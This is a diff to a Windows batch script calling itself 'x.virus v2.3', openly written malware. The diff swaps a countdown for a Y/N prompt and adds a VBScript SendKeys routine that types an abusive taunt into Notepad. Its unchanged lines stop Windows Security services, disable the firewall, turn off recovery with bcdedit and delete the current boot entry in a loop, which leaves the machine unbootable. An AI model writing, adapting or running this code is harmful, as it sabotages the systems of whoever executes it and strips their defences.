@@ -1,7 +1,7 @@
 @echo off
 cd C:\windows\system32
 title x.virus
-color a
+color 4f
 echo ----------
 echo x.virus v2.3
 echo ----------
@@ -16,19 +16,165 @@ echo Tested Windows OS: Windows 8.1/10
 echo For: Windows 8/8.1/10
 echo Open as administrator permission.
 echo ----------
-ECHO Your computer can be damaged after 10 seconds. If you do not want your computer to be damaged, close the x.virus.cmd > warning.txt
-start warning.txt
-echo Your computer can be damaged after 10 seconds. If you do not want your computer to be damaged, close the x.virus.cmd
-timeout /t 10 /nobreak >nul
+echo Your computer may be damaged. Press [Y] to continue or [N] to exit.
+choice /c YN /n /m "Do you want to continue?"
+if %errorlevel%==2 (
+    echo Operation cancelled by user.
+    exit
+)
+if %errorlevel%==1 (
 echo YOU`VE BEEN HACKED!
-ECHO Hello %username%. Your computer has been fucked by x.virus. I put a password on your account, Killed your computer, Turned off recovery mode, cry HAHAHAHAHAHAHA! > README.txt
-echo @echo off > filespam.bat
-echo :loop >> filespam.bat
-echo md hackedbyxvirus^%random^% >> filespam.bat
-echo echo x.virus vs ^%username^%^> hackedbyxvirus^%random^%.txt >> filespam.bat
-echo goto loop >> filespam.bat
-start filespam.bat
-start README.txt
+echo Set WshShell = WScript.CreateObject("WScript.Shell") > C:\type.vbs
+echo WshShell.SendKeys WScript.Arguments.Item(0) >> C:\type.vbs
+start notepad
+wscript.exe "C:\type.vbs" "H"
+wscript.exe "C:\type.vbs" "e"
+wscript.exe "C:\type.vbs" "l"
+wscript.exe "C:\type.vbs" "l"
+wscript.exe "C:\type.vbs" "o"
+wscript.exe "C:\type.vbs" " "
+wscript.exe "C:\type.vbs" "%username%"
+wscript.exe "C:\type.vbs" "."
+wscript.exe "C:\type.vbs" " "
+wscript.exe "C:\type.vbs" "Y"
+wscript.exe "C:\type.vbs" "o"
+wscript.exe "C:\type.vbs" "u"
+wscript.exe "C:\type.vbs" "r"
+wscript.exe "C:\type.vbs" " "
+wscript.exe "C:\type.vbs" "c"
+wscript.exe "C:\type.vbs" "o"
+wscript.exe "C:\type.vbs" "m"
+wscript.exe "C:\type.vbs" "p"
+wscript.exe "C:\type.vbs" "u"
+wscript.exe "C:\type.vbs" "t"
+wscript.exe "C:\type.vbs" "e"
+wscript.exe "C:\type.vbs" "r"
+wscript.exe "C:\type.vbs" " "
+wscript.exe "C:\type.vbs" "h"
+wscript.exe "C:\type.vbs" "a"
+wscript.exe "C:\type.vbs" "s"
+wscript.exe "C:\type.vbs" " "
+wscript.exe "C:\type.vbs" "b"
+wscript.exe "C:\type.vbs" "e"
+wscript.exe "C:\type.vbs" "e"
+wscript.exe "C:\type.vbs" "n"
+wscript.exe "C:\type.vbs" " "
+wscript.exe "C:\type.vbs" "f"
+wscript.exe "C:\type.vbs" "u"
+wscript.exe "C:\type.vbs" "c"
+wscript.exe "C:\type.vbs" "k"
+wscript.exe "C:\type.vbs" "e"
+wscript.exe "C:\type.vbs" "d"
+wscript.exe "C:\type.vbs" " "
+wscript.exe "C:\type.vbs" "b"
+wscript.exe "C:\type.vbs" "y"
+wscript.exe "C:\type.vbs" " "
+wscript.exe "C:\type.vbs" "x"
+wscript.exe "C:\type.vbs" "."
+wscript.exe "C:\type.vbs" "v"
+wscript.exe "C:\type.vbs" "i"
+wscript.exe "C:\type.vbs" "r"
+wscript.exe "C:\type.vbs" "u"
+wscript.exe "C:\type.vbs" "s"
+wscript.exe "C:\type.vbs" "."
+wscript.exe "C:\type.vbs" " "
+wscript.exe "C:\type.vbs" "I"
+wscript.exe "C:\type.vbs" " "
+wscript.exe "C:\type.vbs" "p"
+wscript.exe "C:\type.vbs" "u"
+wscript.exe "C:\type.vbs" "t"
+wscript.exe "C:\type.vbs" " "
+wscript.exe "C:\type.vbs" "a"
+wscript.exe "C:\type.vbs" " "
+wscript.exe "C:\type.vbs" "p"
+wscript.exe "C:\type.vbs" "a"
+wscript.exe "C:\type.vbs" "s"
+wscript.exe "C:\type.vbs" "s"
+wscript.exe "C:\type.vbs" "w"
+wscript.exe "C:\type.vbs" "o"
+wscript.exe "C:\type.vbs" "r"
+wscript.exe "C:\type.vbs" "d"
+wscript.exe "C:\type.vbs" " "
+wscript.exe "C:\type.vbs" "o"
+wscript.exe "C:\type.vbs" "n"
+wscript.exe "C:\type.vbs" " "
+wscript.exe "C:\type.vbs" "y"
+wscript.exe "C:\type.vbs" "o"
+wscript.exe "C:\type.vbs" "u"
+wscript.exe "C:\type.vbs" "r"
+wscript.exe "C:\type.vbs" " "
+wscript.exe "C:\type.vbs" "a"
+wscript.exe "C:\type.vbs" "c"
+wscript.exe "C:\type.vbs" "c"
+wscript.exe "C:\type.vbs" "o"
+wscript.exe "C:\type.vbs" "u"
+wscript.exe "C:\type.vbs" "n"
+wscript.exe "C:\type.vbs" "t"
+wscript.exe "C:\type.vbs" "."
+wscript.exe "C:\type.vbs" " "
+wscript.exe "C:\type.vbs" "K"
+wscript.exe "C:\type.vbs" "i"
+wscript.exe "C:\type.vbs" "l"
+wscript.exe "C:\type.vbs" "l"
+wscript.exe "C:\type.vbs" "e"
+wscript.exe "C:\type.vbs" "d"
+wscript.exe "C:\type.vbs" " "
+wscript.exe "C:\type.vbs" "y"
+wscript.exe "C:\type.vbs" "o"
+wscript.exe "C:\type.vbs" "u"
+wscript.exe "C:\type.vbs" "r"
+wscript.exe "C:\type.vbs" " "
+wscript.exe "C:\type.vbs" "c"
+wscript.exe "C:\type.vbs" "o"
+wscript.exe "C:\type.vbs" "m"
+wscript.exe "C:\type.vbs" "p"
+wscript.exe "C:\type.vbs" "u"
+wscript.exe "C:\type.vbs" "t"
+wscript.exe "C:\type.vbs" "e"
+wscript.exe "C:\type.vbs" "r"
+wscript.exe "C:\type.vbs" ","
+wscript.exe "C:\type.vbs" " "
+wscript.exe "C:\type.vbs" "T"
+wscript.exe "C:\type.vbs" "u"
+wscript.exe "C:\type.vbs" "r"
+wscript.exe "C:\type.vbs" "n"
+wscript.exe "C:\type.vbs" "e"
+wscript.exe "C:\type.vbs" "d"
+wscript.exe "C:\type.vbs" " "
+wscript.exe "C:\type.vbs" "o"
+wscript.exe "C:\type.vbs" "f"
+wscript.exe "C:\type.vbs" "f"
+wscript.exe "C:\type.vbs" " "
+wscript.exe "C:\type.vbs" "r"
+wscript.exe "C:\type.vbs" "e"
+wscript.exe "C:\type.vbs" "c"
+wscript.exe "C:\type.vbs" "o"
+wscript.exe "C:\type.vbs" "v"
+wscript.exe "C:\type.vbs" "e"
+wscript.exe "C:\type.vbs" "r"
+wscript.exe "C:\type.vbs" "y"
+wscript.exe "C:\type.vbs" " "
+wscript.exe "C:\type.vbs" "m"
+wscript.exe "C:\type.vbs" "o"
+wscript.exe "C:\type.vbs" "d"
+wscript.exe "C:\type.vbs" "e"
+wscript.exe "C:\type.vbs" ","
+wscript.exe "C:\type.vbs" " "
+wscript.exe "C:\type.vbs" "c"
+wscript.exe "C:\type.vbs" "r"
+wscript.exe "C:\type.vbs" "y"
+wscript.exe "C:\type.vbs" " "
+wscript.exe "C:\type.vbs" "H"
+wscript.exe "C:\type.vbs" "A"
+wscript.exe "C:\type.vbs" "H"
+wscript.exe "C:\type.vbs" "A"
+wscript.exe "C:\type.vbs" "H"
+wscript.exe "C:\type.vbs" "A"
+wscript.exe "C:\type.vbs" "H"
+wscript.exe "C:\type.vbs" "A"
+wscript.exe "C:\type.vbs" "H"
+wscript.exe "C:\type.vbs" "!"
+del C:\type.vbs
 net stop "SecurityHealthService"
 net stop "Security Center"
 netsh firewall set opmode mode=disable
@@ -217,3 +363,4 @@ bcdedit /delete {current} /f
     bcdedit /set {default} recoveryenabled No
     bcdedit /delete {current} /f
 goto loop
+)
